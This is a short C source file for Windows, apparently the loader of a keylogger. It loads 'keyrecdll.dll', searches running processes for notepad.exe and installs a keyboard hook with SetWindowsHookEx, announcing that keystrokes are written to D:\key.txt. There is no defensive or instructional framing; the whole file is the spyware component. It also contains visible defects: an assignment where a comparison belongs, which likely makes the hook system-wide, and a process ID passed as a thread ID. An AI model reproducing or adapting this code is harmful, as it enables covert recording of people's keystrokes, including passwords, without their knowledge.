#include <windows.h>
#include <stdio.h> 
#include <tchar.h>
#include <Psapi.h>
#pragma comment(lib,"Psapi.lib")
#include <tlhelp32.h>

/*
如果修改如下信息，需要重新编译：
    锁定程序文件名
    记录文件路径
    dll文件名
*/

HANDLE hDesProcess = NULL;
const LPCTSTR lpszProcessName = _T("notepad.exe"); //target program to record input key

int main(){
    printf("Start\n");
    HMODULE hMod = LoadLibraryA("keyrecdll.dll");
    if(!hMod){
        printf("Load DLL fail");
        return FALSE;
    }
    
    DWORD lpFunc = (DWORD)GetProcAddress(hMod, "?MyHook@@YGJHIJ@Z");
    if(!lpFunc){
        if(hMod) 
            FreeLibrary(hMod);
        printf("Error: Load DLL function FAIL!\n");
        return FALSE;
    }
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD dwThreadId=0;

    PROCESSENTRY32 pe = { sizeof(pe) };
    BOOL fOk;
    for (fOk = Process32First(hSnapshot, &pe); fOk; fOk = Process32Next(hSnapshot, &pe)){
        // if (!_tcscmp(pe.szExeFile, "notepad.exe")){
        if (!_tcscmp(pe.szExeFile, lpszProcessName)){
            printf("Succeed: Get Thread ID: %ld\n",pe.th32ProcessID);
            dwThreadId = pe.th32ProcessID;
        }
    
    }
    if (dwThreadId=0)
        printf("Error: Thread ID not found.\n");
    
    HHOOK hhook = SetWindowsHookEx(
    WH_KEYBOARD,//WH_KEYBOARD,//WH_CALLWNDPROC,
    (HOOKPROC)lpFunc,
    hMod,
    dwThreadId);
    
    printf("Hook Sueecss!\n Output: D:\\key.txt");
    
    while(1){
    }
    
    return 0;
}

